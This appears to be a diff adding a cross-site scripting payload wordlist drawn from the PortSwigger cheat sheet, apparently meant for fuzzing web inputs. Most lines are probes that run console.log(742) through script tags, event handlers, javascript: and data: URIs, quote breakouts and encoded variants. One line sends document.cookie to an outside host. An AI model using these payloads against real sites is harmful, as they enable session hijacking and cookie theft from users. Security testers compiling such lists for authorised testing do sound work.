@@ -1,0 +1,39 @@
+#https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+javascript:console.log(742);//
+<script>document.location='http://google.com?c='+document.cookie</script>
+console.log(742)
+javascript:console.log(742)
+data:text/javascript,console.log(742)
+'; console.log(742);//
+"; console.log(742);//
+\'; console.log(742);//
+\"; console.log(742);//
+\u0027; console.log(742);//
+\u0022"; console.log(742);//
+<script>console.log(742);</script>
+<<script>console.log(742);</script>
+<script>console.log(742);</script
+<script%0a>console.log(742);</script
+<script src="data:text/javascript,console.log(742)"></script>
+<script src="data:text/javascript,console.log(742)"></script
+<script%0a src="data:text/javascript,console.log(742)"></script
+<img src/onerror=console.log(742)>
+<p onpointermove=console.log(742)>w1ndsor</p>
+<a href=javascript:console.log(742)>w1ndsor</a>
+<fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1 onpointerenter="console.log(742)">w1ndsor</fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1>
+><fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1 onpointerenter="console.log(742)">w1ndsor</fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1>
+";</script><script>console.log(742);</script>
+';</script><script>console.log(742);</script>
+";</script><img src/onerror=console.log(742)>
+';</script><img src/onerror=console.log(742)>
+></script><script>console.log(742);</script>
+><img src/onerror=console.log(742)>
+<<img src/onerror=console.log(742)>
+x onpointermove=console.log(742)
+x" onpointermove="console.log(742)"
+x' onpointermove='console.log(742)'
+%C0%BCscript>console.log(742)</script> %E0%80%BCscript>console.log(742)</script> %F0%80%80%BCscript>console.log(742)</script> %F8%80%80%80%BCscript>console.log(742)</script> %FC%80%80%80%80%BCscript>console.log(742)</script>
+%3c%73%63%72%69%70%74%3e%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%37%34%32%29%3b%3c%2f%73%63%72%69%70%74%3e
+<a href="javascript:console.log(742)"
+<form action=javascript:console.log(742)"
+<body onload=javascript:console.log(742)"
